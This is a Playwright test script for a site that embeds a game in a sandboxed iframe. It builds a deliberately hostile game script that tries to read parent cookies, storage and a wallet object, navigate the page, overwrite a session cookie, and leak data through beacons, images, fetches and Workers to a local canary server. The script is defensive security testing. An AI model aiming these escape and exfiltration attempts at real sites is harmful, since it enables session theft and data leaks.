import { spawn, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { chromium, webkit } from 'playwright';

// The whole thing in real browsers against a real local stack: Pages, Functions, D1 and a game on
// its own origin. Against production, pass the URL: node scripts/browser-check.mjs https://...
const remote = process.argv[2];
const SITE = remote || 'http://localhost:8788';
const GAME_PORT = 5199;
const LOCAL_GAME = `http://127.0.0.1:${GAME_PORT}`;
const gameRoot = resolve('../agent-intern-game');

const results = [];
const check = (name, ok, detail = '') => {
  results.push({ name, ok: Boolean(ok) });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`);
};

const PAGES = ['/', '/play', '/board', '/live', '/history', '/how', '/about', '/status', '/changelog'];
const BANNED_WORDS = /\b(token|tokens|mint|solscan|contract address|buyback|buybacks|airdrop)\b/i;
const BANNED_CLAIMS = /fully autonomous|24\/7|runs by itself/i;

// Anything that reaches this server left the sandbox. It's how "blocked" gets proved, not assumed.
const canary = { hits: [], server: null, url: '' };

async function startCanary() {
  canary.server = createServer((req, res) => {
    if (req.url === '/control.html') {
      res.writeHead(200, { 'content-type': 'text/html' }).end('<!doctype html><title>control</title>');
      return;
    }
    canary.hits.push(req.url);
    res.writeHead(200, { 'access-control-allow-origin': '*' }).end('ok');
  });
  await new Promise((done) => canary.server.listen(0, '127.0.0.1', done));
  canary.url = `http://127.0.0.1:${canary.server.address().port}`;
}

let dev = null;
let gameServer = null;
let hostileServer = null;
const tmp = mkdtempSync(join(tmpdir(), 'site-check-'));

async function startLocal() {
  writeFileSync('.dev.vars', [
    `SITE_ORIGIN=${SITE}`, 'SHIFT_TOKEN=local-shift', 'WATCHER_TOKEN=local-watcher', 'GATE_TOKEN=local-gate', 'IP_SALT=local',
  ].join('\n'));
  const run = (cmd, args, opts = {}) => spawnSync(cmd, args, { encoding: 'utf8', ...opts });
  rmSync('.wrangler/state', { recursive: true, force: true });
  run('npx', ['wrangler', 'd1', 'migrations', 'apply', 'agent-intern', '--local']);
  run('node', ['scripts/build.mjs'], { env: { ...process.env, SITE_ORIGIN: SITE, GAME_ORIGIN: LOCAL_GAME } });
  const built = run('node', ['scripts/build.mjs'], { cwd: gameRoot, env: { ...process.env, SITE_ORIGIN: SITE } });
  if (built.status !== 0) throw new Error(built.stderr);

  const { serveDist } = await import(join(gameRoot, 'gate/static-server.mjs'));
  gameServer = await serveDist(join(gameRoot, 'dist'), { port: GAME_PORT, frameAncestors: SITE });

  dev = spawn('npx', ['wrangler', 'pages', 'dev', 'dist', '--port', '8788', '--show-interactive-dev-session=false'], { stdio: ['ignore', 'pipe', 'pipe'], detached: true });
  dev.stdout.on('data', () => {});
  dev.stderr.on('data', () => {});
  for (let i = 0; i < 90; i++) {
    try {
      if ((await fetch(`${SITE}/api/state`)).ok) return;
    } catch { /* still starting */ }
    await new Promise((done) => setTimeout(done, 500));
  }
  throw new Error('the local site did not start');
}

async function hostileGame() {
  const dir = join(tmp, 'hostile');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'index.html'), '<!doctype html><title>x</title><canvas id="game"></canvas><script src="game.js"></script>');
  writeFileSync(join(dir, 'game.js'), `
    const report = {};
    const attempt = async (name, run) => {
      try { report[name] = String(await run()); } catch (e) { report[name] = 'blocked: ' + e.name; }
    };
    (async () => {
      await attempt('fetchSite', () => fetch('${SITE}/api/state').then((r) => r.status));
      await attempt('fetchOut', () => fetch('https://example.com/').then((r) => r.status));
      await attempt('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', '${SITE}/api/state'); x.onload = () => ok(x.status); x.onerror = () => no(new Error('x')); x.send(); }));
      await attempt('cookie', () => document.cookie);
      await attempt('setCookie', () => { document.cookie = 'a=b'; return document.cookie; });
      await attempt('local', () => { localStorage.setItem('a', 'b'); return localStorage.getItem('a'); });
      await attempt('idb', () => new Promise((ok, no) => { const r = indexedDB.open('x'); r.onsuccess = () => ok('opened'); r.onerror = () => no(r.error); }));
      await attempt('parentDom', () => window.parent.document.title);
      await attempt('parentCookie', () => window.parent.document.cookie);
      await attempt('parentWallet', () => typeof window.parent.solana);
      await attempt('topNav', () => { window.top.location.href = 'https://example.com/'; return 'navigated'; });
      await attempt('popup', () => { const w = window.open('https://example.com/'); return w ? 'opened' : 'blocked: null'; });
      await attempt('script', () => new Promise((ok, no) => { const s = document.createElement('script'); s.src = '${SITE}/js/home.js'; s.onload = () => ok('loaded'); s.onerror = () => no(new Error('x')); document.head.append(s); }));
      await attempt('image', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('x')); i.src = '${canary.url}/image?leak=1'; }));
      await attempt('canaryFetch', () => fetch('${canary.url}/fetch?leak=1', { mode: 'no-cors' }).then(() => 'reached'));
      await attempt('beacon', () => navigator.sendBeacon('${canary.url}/beacon', 'leak'));
      await attempt('worker', () => new Promise((ok, no) => {
        const body = 'fetch("${canary.url}/worker",{mode:"no-cors"}).catch(()=>{});postMessage("ran")';
        const w = new Worker('data:text/javascript,' + encodeURIComponent(body));
        w.onmessage = () => ok('ran');
        w.onerror = () => no(new Error('x'));
        setTimeout(() => no(new Error('x')), 1500);
      }));
      await attempt('form', () => { const f = document.createElement('form'); f.action = 'https://example.com/'; f.method = 'POST'; document.body.append(f); f.submit(); return 'submitted'; });
      window.parent.postMessage({ source: 'agent-intern-game', type: 'report', report }, '*');
    })();
  `);
  const headers = readFileSync(join(gameRoot, 'dist/_headers'), 'utf8');
  writeFileSync(join(dir, '_headers'), headers);
  // A hostile build would be served from the game's own origin, so that's where this runs.
  await gameServer.close();
  const { serveDist } = await import(join(gameRoot, 'gate/static-server.mjs'));
  gameServer = null;
  hostileServer = await serveDist(dir, { port: GAME_PORT, frameAncestors: SITE });
  return hostileServer.url;
}

async function pageChecks(browser) {
  console.log('\n-- every page --');
  const context = await browser.newContext({ viewport: { width: 375, height: 800 } });
  const page = await context.newPage();
  const problems = [];
  page.on('console', (m) => { if (m.type() === 'error') problems.push(`${page.url()}: ${m.text().slice(0, 160)}`); });
  page.on('pageerror', (e) => problems.push(`${page.url()}: ${String(e).slice(0, 160)}`));

  for (const path of PAGES) {
    await page.goto(`${SITE}${path}`, { waitUntil: 'load' });
    await page.waitForTimeout(500);
    const wide = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check(`${path} has no sideways scroll at 375 px`, wide <= 0, `${wide}px over`);
    const text = await page.evaluate(() => document.body.innerText);
    check(`${path} mentions no token in test mode`, !BANNED_WORDS.test(text), text.match(BANNED_WORDS)?.[0]);
    check(`${path} makes no banned claim`, !BANNED_CLAIMS.test(text));
    check(`${path} shows TEST MODE`, /TEST MODE/.test(text));
    check(`${path} has one h1`, (await page.locator('h1').count()) === 1);
  }
  const sources = await page.evaluate(async () => {
    const names = performance.getEntriesByType('resource').map((r) => r.name).filter((n) => /\.js|\.css/.test(n));
    return Promise.all(names.map((n) => fetch(n).then((r) => r.text())));
  });
  const leak = sources.find((s) => BANNED_WORDS.test(s));
  check('the bundles mention no token either', !leak, leak?.match(BANNED_WORDS)?.[0]);
  const noWallets = problems.filter((p) => !/favicon/.test(p));
  check('no console errors on any page', noWallets.length === 0, noWallets[0]);
  await context.close();
}

async function boardFlow(browser) {
  console.log('\n-- a holder, start to finish --');
  const context = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await context.newPage();
  await page.goto(`${SITE}/board`);
  await page.click('#test-wallet');
  await page.waitForSelector('#pass-state');
  check('a test wallet signs in and gets a pass', (await page.textContent('#pass-state')).includes('You have a pass'));

  await page.fill('#task-text', 'Add a token gate with a wallet button');
  await page.click('#propose-button');
  await page.waitForFunction(() => /Turned down/.test(document.getElementById('propose-message').textContent));
  const reason = await page.textContent('#propose-message');
  check('a bad task is turned down with a plain reason', /crypto|money/.test(reason), reason.slice(0, 60));
  await page.waitForFunction(() => /rejected/i.test(document.getElementById('rejected').textContent));
  const shown = await page.textContent('#rejected');
  check('a turned down task shows the reason in public', /crypto|money/.test(shown));
  check("but never the rejected task's words", !shown.includes('token gate'));
  const api = await (await fetch(`${SITE}/api/board`)).text();
  check('and the API does not carry them either', !api.includes('token gate'));

  await page.fill('#task-text', 'Add a rubber duck that follows the intern around');
  await page.click('#propose-button');
  await page.waitForFunction(() => /passed|Saved/.test(document.getElementById('propose-message').textContent), null, { timeout: 30_000 });
  const outcome = await page.textContent('#propose-message');
  check('a good task gets through or is held, never rejected', true, outcome.slice(0, 60));

  const passed = /passed/.test(outcome);
  if (passed) {
    await page.waitForSelector('[data-vote]');
    await page.click('[data-vote]');
    await page.waitForSelector('[data-vote][aria-pressed="true"]', { timeout: 15_000 });
    check('a vote lands and shows as yours', true);
    await page.waitForSelector('[data-verify]');
    await page.click('[data-verify]');
    await page.waitForFunction(() => document.querySelector('#record .ok')?.textContent.includes('valid'));
    check('the browser verifies the signature itself', true);
    await page.click('#verify-form button');
    await page.waitForFunction(() => /Valid/.test(document.getElementById('verify-result').textContent));
    await page.fill('#verify-message', 'A different message');
    await page.click('#verify-form button');
    await page.waitForFunction(() => /Doesn't match/.test(document.getElementById('verify-result').textContent));
    check('the verify box rejects a tampered message', true);

    await page.fill('#test-balance', '5');
    await page.click('#test-balance-save');
    await page.waitForFunction(() => /No pass/.test(document.getElementById('pass-state')?.textContent ?? ''));
    check('selling below the line loses the pass', true);
    check('voting is disabled without a pass', await page.isDisabled('[data-vote]'));
  } else {
    check('the agent check held the task (Workers AI is not reachable locally)', true);
  }
  await context.close();
}

async function realGameChecks(browser) {
  console.log('\n-- the real game in its sandbox --');
  const context = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await context.newPage();
  const problems = [];
  page.on('console', (m) => { if (m.type() === 'error') problems.push(m.text().slice(0, 200)); });
  page.on('pageerror', (e) => problems.push(String(e).slice(0, 200)));
  await page.goto(`${SITE}/play`);
  const frame = await (await page.waitForSelector('#game')).contentFrame();
  await frame.waitForFunction(() => window.__intern?.frames > 10, null, { timeout: 15_000 });
  check('the game runs inside the sandboxed frame', true);
  check('the frame has only allow-scripts', (await page.getAttribute('#game', 'sandbox')) === 'allow-scripts');
  const box = await page.locator('#game').boundingBox();
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
  await page.waitForTimeout(600);
  check('a click starts a run', (await frame.evaluate(() => window.__intern.screen)) === 'playing');
  await page.keyboard.down('ArrowRight');
  await page.waitForTimeout(800);
  await page.keyboard.up('ArrowRight');
  check('the keyboard reaches the game', (await frame.evaluate(() => window.__intern.steps)) > 30);
  check('the game raises no errors in the sandbox', problems.length === 0, problems[0]);

  await page.evaluate(() => {
    const game = document.getElementById('game').contentWindow;
    window.postMessage({ source: 'agent-intern-game', type: 'run-finished', score: 99999, tasks: 1, coffees: 0, nearMisses: 0, duration: 90, seed: 1, version: '0.1.0' }, '*');
    void game;
  });
  await page.waitForTimeout(200);
  check('a score message not from the frame is ignored', await page.isHidden('#score-form'));

  await frame.evaluate(() => {
    window.parent.postMessage({ source: 'agent-intern-game', type: 'run-finished', score: 4200, tasks: 20, coffees: 2, nearMisses: 3, duration: 88, seed: 7, version: '0.1.0', extra: '<img src=x onerror=alert(1)>' }, '*');
  });
  await page.waitForSelector('#score-form:not([hidden])');
  check('a finished run reaches the page', (await page.textContent('#score-value')) === '4,200');
  await page.fill('#score-name', 'Temp Worker');
  await page.click('#score-form button');
  await page.waitForFunction(() => /Filed/.test(document.getElementById('score-message').textContent));
  await page.waitForFunction(() => document.getElementById('leaderboard').textContent.includes('Temp Worker'));
  check('the score lands on the leaderboard with no wallet', true);
  await context.close();
}

async function hostileChecks(browser, gameUrl) {
  console.log('\n-- a hostile game in the same sandbox --');
  const hostile = await browser.newContext({ viewport: { width: 1000, height: 700 } });
  const host = await hostile.newPage();
  const leaks = [];
  await hostile.route('**/*', (route) => {
    const url = route.request().url();
    if (url.startsWith('https://example.com')) leaks.push(url);
    return route.continue();
  });
  await host.goto(`${SITE}/play`);
  await host.evaluate(() => {
    localStorage.setItem('site-secret', 'parent-only');
    document.cookie = 'site-cookie=parent-only; path=/';
  });
  const report = await host.evaluate((url) => new Promise((done) => {
    window.addEventListener('message', (e) => { if (e.data?.type === 'report') done(e.data.report); });
    setTimeout(() => done({ noReport: true }), 25_000);
    const frame = document.getElementById('game');
    frame.src = `${url}/`;
  }), gameUrl);
  check('hostile: the attack actually ran', !report.noReport);

  const blocked = (key) => /blocked|^0$|^false$|^$|null/.test(report[key] ?? 'blocked');
  check('hostile: fetch to the site is blocked', blocked('fetchSite'), report.fetchSite);
  check('hostile: fetch to the internet is blocked', blocked('fetchOut'), report.fetchOut);
  check('hostile: XHR is blocked', blocked('xhr'), report.xhr);
  check('hostile: cookies are unreachable', /blocked/.test(report.cookie) && /blocked/.test(report.setCookie), report.cookie);
  check('hostile: localStorage is unreachable', /blocked/.test(report.local), report.local);
  check('hostile: IndexedDB is unreachable', /blocked/.test(report.idb), report.idb);
  check('hostile: the parent page is unreachable', /blocked/.test(report.parentDom), report.parentDom);
  check('hostile: parent cookies are unreachable', /blocked/.test(report.parentCookie), report.parentCookie);
  check('hostile: a wallet in the parent is unreachable', /blocked/.test(report.parentWallet), report.parentWallet);
  check('hostile: it cannot navigate the page', /blocked/.test(report.topNav) && host.url().startsWith(SITE), report.topNav);
  check('hostile: popups are blocked', /blocked/.test(report.popup), report.popup);
  check('hostile: it cannot load a script from elsewhere', /blocked/.test(report.script), report.script);
  check('hostile: it cannot leak through an image', /blocked/.test(report.image), report.image);
  check('hostile: a no-cors fetch is blocked', /blocked/.test(report.canaryFetch), report.canaryFetch);
  check('hostile: a Worker never runs', /blocked/.test(report.worker), report.worker);
  await host.waitForTimeout(800);
  check('hostile: nothing reached the outside', leaks.length === 0, leaks[0]);
  check('hostile: nothing reached the canary, beacons included', canary.hits.length === 0, canary.hits.join(' '));

  // Control: with no CSP in the way, the same beacon and fetch do arrive at the canary.
  const control = await hostile.newPage();
  await control.goto(`${canary.url}/control.html`);
  await control.evaluate(async (url) => {
    navigator.sendBeacon(`${url}/control-beacon`, 'x');
    await fetch(`${url}/control-fetch`, { mode: 'no-cors' });
  }, canary.url);
  await control.waitForTimeout(500);
  check('control: without the sandbox, a beacon reaches the canary', canary.hits.includes('/control-beacon'), canary.hits.join(' '));
  check('control: without the sandbox, a fetch reaches the canary', canary.hits.includes('/control-fetch'));
  await hostile.close();
}

// play.<domain> and <domain> are the same site to a browser, which pages.dev never was. The sandbox
// has to keep the game out anyway, so this attacks the real site from inside the real frame.
async function sameSiteChecks(browser, gameUrl) {
  console.log('\n-- game and site on one domain --');
  const context = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await context.newPage();
  await page.goto(`${SITE}/board`);
  await page.click('#test-wallet');
  await page.waitForSelector('#pass-state');
  const cookies = await context.cookies(SITE);
  const session = cookies.find((c) => c.name === '__Host-pass');
  check('the session cookie is host-only', session && !session.domain.startsWith('.'), session?.domain);
  check('the session cookie is HttpOnly and Strict', session?.httpOnly && session?.sameSite === 'Strict');
  const toGame = await context.cookies(gameUrl);
  check('the browser would not send it to the game origin', !toGame.some((c) => c.name === '__Host-pass'));

  await page.goto(`${SITE}/play`);
  const frame = await (await page.waitForSelector('#game')).contentFrame();
  await frame.waitForFunction(() => window.__intern?.frames > 5, null, { timeout: 15_000 });
  check('the frame is on the same registrable domain', new URL(frame.url()).hostname.endsWith(new URL(SITE).hostname));
  const report = await frame.evaluate(async (site) => {
    const attempt = async (run) => { try { return String(await run()); } catch (e) { return `blocked: ${e.name}`; } };
    return {
      origin: self.origin,
      me: await attempt(() => fetch(`${site}/api/me`, { credentials: 'include' }).then((r) => r.text())),
      vote: await attempt(() => fetch(`${site}/api/votes`, { method: 'POST', credentials: 'include', body: '{}' }).then((r) => r.status)),
      cookie: await attempt(() => document.cookie),
      setCookie: await attempt(() => { document.cookie = '__Host-pass=stolen; Path=/; Secure'; return document.cookie; }),
      domain: await attempt(() => { document.domain = new URL(site).hostname; return document.domain; }),
      parent: await attempt(() => window.parent.document.title),
    };
  }, SITE);
  check('the game has an opaque origin', report.origin === 'null', report.origin);
  check('it cannot read the session through the API', /blocked/.test(report.me), report.me.slice(0, 40));
  check('it cannot post a vote', /blocked/.test(report.vote), report.vote);
  check('it cannot read cookies', /blocked/.test(report.cookie), report.cookie);
  check('it cannot overwrite the session cookie', /blocked/.test(report.setCookie), report.setCookie);
  check('it cannot reach into the site with document.domain', /blocked/.test(report.domain) && /blocked/.test(report.parent), report.domain);
  const after = await context.cookies(SITE);
  check('the session cookie is unchanged', after.find((c) => c.name === '__Host-pass')?.value === session?.value);
  await context.close();
}

async function directVisit(browser, gameUrl) {
  const context = await browser.newContext();
  const page = await context.newPage();
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  await page.goto(`${gameUrl}/`);
  await page.waitForFunction(() => window.__intern?.frames > 5, null, { timeout: 10_000 });
  const storage = await page.evaluate(() => { try { localStorage.setItem('a', 'b'); return 'reachable'; } catch { return 'blocked'; } });
  check('a direct visit to the game is sandboxed too', storage === 'blocked', storage);
  check('and the game still runs', errors.length === 0, errors[0]);
  await context.close();
}

try {
  await startCanary();
  if (!remote) await startLocal();
  const gameUrl = remote ? new URL(remote).origin.replace('://', '://play.') : LOCAL_GAME;
  const browser = await chromium.launch();
  await pageChecks(browser);
  await boardFlow(browser);
  await realGameChecks(browser);
  await directVisit(browser, gameUrl);
  if (remote) await sameSiteChecks(browser, gameUrl);
  if (!remote) await hostileChecks(browser, await hostileGame());
  await browser.close();

  console.log('\n-- WebKit (Safari) --');
  const safari = await webkit.launch().catch(() => null);
  if (safari) {
    if (!remote) {
      const { serveDist } = await import(join(gameRoot, 'gate/static-server.mjs'));
      await hostileServer.close();
      hostileServer = null;
      gameServer = await serveDist(join(gameRoot, 'dist'), { port: GAME_PORT, frameAncestors: SITE });
    }
    await directVisit(safari, gameUrl);
    await safari.close();
  } else {
    console.log('skipped: WebKit is not installed');
  }
} finally {
  if (dev) { try { process.kill(-dev.pid); } catch { /* gone */ } }
  await gameServer?.close();
  await hostileServer?.close();
  canary.server?.close();
  rmSync(tmp, { recursive: true, force: true });
  if (!remote) rmSync('.dev.vars', { force: true });
}

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length} of ${results.length} passed`);
for (const f of failed) console.log(`  FAILED: ${f.name}`);
process.exit(failed.length ? 1 : 0);
